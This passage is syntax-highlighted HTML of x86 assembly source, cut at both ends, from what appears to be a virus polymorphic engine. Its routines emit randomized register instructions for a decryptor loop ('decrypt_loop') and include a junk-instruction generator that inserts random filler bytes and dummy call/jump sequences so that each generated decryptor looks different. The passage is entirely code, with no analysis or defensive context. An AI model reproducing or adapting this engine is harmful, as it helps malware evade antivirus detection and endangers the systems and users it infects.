    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e8h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">i_end1</span><span class="sc0">
</span><span class="sc5">d_next0</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">             </span><span class="sc1">;DEC reg</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">i_end1</span><span class="sc0">
</span><span class="sc5">d_next1</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">                </span><span class="sc1">;MOV EAX, random_value</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;SUB reg, EAX</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;ADD reg, random_value-1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2bh</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c0h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">n_end1</span><span class="sc0">
</span><span class="sc5">d_next2</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">             </span><span class="sc1">;XCHG EAX, reg</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">              </span><span class="sc1">;DEC EAX</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;XCHG EAX, reg</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">i_end1</span><span class="sc0">
</span><span class="sc5">greg6</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">greg7</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">l_next0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">51h</span><span class="sc0">             </span><span class="sc1">;PUSH ECX</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;MOV ECX, reg</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8bh</span><span class="sc0">             </span><span class="sc1">;JECXZ label</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;POP ECX</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c8h</span><span class="sc0">                </span><span class="sc1">;JMP decrypt_loop</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">              </span><span class="sc1">;label:</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;POP ECX</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0eb5903e3h</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">59h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">l_next</span><span class="sc0">
</span><span class="sc5">l_next0</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;XOR EAX, EAX</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">              </span><span class="sc1">;DEC EAX</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">make_xor</span><span class="sc0">               </span><span class="sc1">;ADD EAX, reg</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">;JNS decrypt_loop</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c0h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">79h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc5">l_next</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rjunk</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc5">Pshd</span><span class="sc0">
</span><span class="sc5">greg7</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">rjunkjc</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">rjn</span><span class="sc0">
</span><span class="sc5">rjunk</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">            </span><span class="sc1">;junk instruction generator</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">     </span><span class="sc1">;0=5, 1=1+2, 2=2+1, 3=1, 4=2, 5=3, 6=none, 7=dummy jump and call</span><span class="sc0">
</span><span class="sc5">rjn</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">j5</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">j_1x2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">j_2x1</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">j2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">j3</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">r_end</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">jcj</span><span class="sc0">

</span><span class="sc5">j1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">junx1</span><span class="sc0">      </span><span class="sc1">;one byte junk instruction</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmc</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">cwde</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">junx1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">j_1x2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">j1</span><span class="sc0">         </span><span class="sc1">;one byte and two byte</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">j2</span><span class="sc0">
</span><span class="sc5">j_2x1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">j2</span><span class="sc0">         </span><span class="sc1">;two byte and one byte</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">j1</span><span class="sc0">
</span><span class="sc5">j3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">junx3</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0c1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c0h</span><span class="sc0">  </span><span class="sc1">;rol eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0c1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e0h</span><span class="sc0">  </span><span class="sc1">;shl eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0c1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c8h</span><span class="sc0">  </span><span class="sc1">;ror eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0c1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e8h</span><span class="sc0">  </span><span class="sc1">;shr eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0c1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d0h</span><span class="sc0">  </span><span class="sc1">;rcl eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0c1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f8h</span><span class="sc0">  </span><span class="sc1">;sar eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0c1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d8h</span><span class="sc0">  </span><span class="sc1">;rcr eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">083h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c0h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">083h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c8h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">083h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d0h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">083h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d8h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">083h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e0h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">083h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e8h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">083h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f0h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">083h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f8h</span><span class="sc0">  </span><span class="sc1">;cmp eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0f8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc0">  </span><span class="sc1">;clc; jc ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0f9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc0">  </span><span class="sc1">;stc; jnc ...</span><span class="sc0">

</span><span class="sc5">junx3</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;three byte junk instruction</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">17</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc5">r_ran</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">r_ran</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">j2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">junx2</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">8bh</span><span class="sc0">     </span><span class="sc1">;mov eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">03h</span><span class="sc0">     </span><span class="sc1">;add eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">13h</span><span class="sc0">     </span><span class="sc1">;adc eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2bh</span><span class="sc0">     </span><span class="sc1">;sub eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1bh</span><span class="sc0">     </span><span class="sc1">;sbb eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0bh</span><span class="sc0">     </span><span class="sc1">;or eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">33h</span><span class="sc0">     </span><span class="sc1">;xor eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">23h</span><span class="sc0">     </span><span class="sc1">;and eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">33h</span><span class="sc0">     </span><span class="sc1">;test eax, ...</span><span class="sc0">

</span><span class="sc5">junx2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;two byte junk instruction</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">11000000b</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">r_end</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">j5</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">junx5</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0b8h</span><span class="sc0">        </span><span class="sc1">;mov eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">05h</span><span class="sc0">     </span><span class="sc1">;add eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">15h</span><span class="sc0">     </span><span class="sc1">;adc eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2dh</span><span class="sc0">     </span><span class="sc1">;sub eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1dh</span><span class="sc0">     </span><span class="sc1">;sbb eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0dh</span><span class="sc0">     </span><span class="sc1">;or eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">35h</span><span class="sc0">     </span><span class="sc1">;xor eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">25h</span><span class="sc0">     </span><span class="sc1">;and eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0a9h</span><span class="sc0">        </span><span class="sc1">;test eax, ...</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">3dh</span><span class="sc0">     </span><span class="sc1">;cmp eax, ...</span><span class="sc0">

</span><span class="sc5">junx5</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;five byte junk instruction</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">jcj</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rjunkjc</span><span class="sc0">        </span><span class="sc1">;junk</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">;CALL label1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">        </span><span class="sc1">;junk</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">;JMP label2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e8h</span><span class="sc0">        </span><span class="sc1">;junk</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">           </span><span class="sc1">;label1: junk</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">        </span><span class="sc1">;RET</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">           </span><span class="sc1">;junk</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">        </span><span class="sc1">;label2:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rjunkjc</span><span class="sc0">        </span><span class="sc1">;junk</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e9h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rjunkjc</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rjunkjc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c3h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rjunkjc</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rjunkjc</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">rjunk</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">
